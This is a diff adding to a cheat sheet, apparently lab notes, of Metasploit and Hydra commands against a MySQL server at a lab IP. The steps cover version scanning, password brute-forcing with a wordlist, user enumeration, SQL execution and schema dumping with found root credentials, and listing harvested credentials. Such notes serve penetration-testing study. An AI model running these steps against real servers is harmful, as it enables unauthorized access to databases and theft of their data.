@@ -50,3 +50,75 @@ Modules used within the Metasploit Framework for database security assessment.
 
 ♦ Dictionary Attack (Hydra)
 → hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> mysql                   # Brute-force attack on MySQL using Hydra.
+
+♦ MySQL Enumeration and Attack
+
+Port → 3306                                # Default port for MySQL
+target IP → 192.143.6.3                    # The target machine's IP address
+ifconfig → 192.143.6.2                     # Your local IP address
+→ service postgresql start                 # Start the required database service for Metasploit
+→ msfconsole                               # Start the Metasploit Framework console
+→ workspace -a MYSQL_Enum                  # Create and switch to a Metasploit workspace
+→ setg RHOSTS 192.143.6.3                  # Globally set the target IP (RHOSTS)
+→ setg RHOST 192.143.6.3                   # Set RHOST (for single host modules)
+
+♦ MySQL Version Scanning
+→ Search type:auxiliary name:mysql           # Search for MySQL-related auxiliary modules
+→ Use auxiliary/scanner/mysql/mysql_version  # Load the MySQL version scanner module
+→ Show options                             # View required options
+→ run                                      # Execute the module
+
+♦ MySQL Login Brute-Force (Using mysql_login)
+→ Search mysql_login                       # Search for the brute-force login module
+→ Use auxiliary/scanner/mysql/mysql_login    # Load the MySQL login brute-forcer module
+→ Show options                             # View required options
+→ Set USERNAME root                        # Set the username to 'root'
+→ Set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt # Set the path to the password wordlist
+→ Set VERBOSE false                        # Disable verbose output
+→ run                                      # Execute the brute-force attack
+
+♦ MySQL User Enumeration (Using mysql_enum)
+→ Search mysql-enum
+→ Use auxiliary/scanner/mysql/mysql_enum
+→ info
+→ Set PASSWORD twinkle
+→ Set USERNAME root
+→ run
+
+♦ MySQL Post-Exploitation (Successful Login: root/twinkle)
+These commands are used after a successful login to gather data.
+
+→ Search mysql_sql                         # Search for the module to execute SQL commands
+→ Use auxiliary/admin/mysql/mysql_sql      # Load the module for executing arbitrary SQL
+→ Show options                             # View options
+→ Set PASSWORD twinkle
+→ Set USERNAME root
+→ run                                      # Execute the module to list databases, show schemas, etc.
+→ Set SQL show databases;                  # Set the SQL command to list all databases
+→ run
+→ Set SQL use videos; show videos;         # Set multiple SQL commands (e.g., use a database and show tables)
+→ run
+
+♦ Schema Dump (Retrieving Database Structure)
+→ Search mysql_schema
+→ Use auxiliary/scanner/mysql/mysql_schemadump # Load the module to dump the database schema
+→ Show options
+→ Set USERNAME root
+→ Set PASSWORD twinkle
+→ run
+
+♦ Credentials and Host Management (Metasploit Console)
+These commands are used to view collected information in the Metasploit session.
+
+→ hosts                                    # List hosts discovered/scanned in the current workspace
+→ services                                 # List services discovered on the hosts
+→ loot                                     # List collected loot (files, hashes, screenshots, etc.)
+→ creds                                    # List harvested credentials
+
+♦ Direct Command-Line Access (External Tool)
+This command demonstrates connecting to the server using the native `mysql` tool with found credentials.
+
+→ exit                                     # Exit the msfconsole
+→ mysql -h 192.143.6.3 -u root -p          # Connect to the target MySQL server using the 'root' user (will prompt for password)
+(password: twinkle)
+→ show databases;                          # Execute an arbitrary command in the native MySQL shell
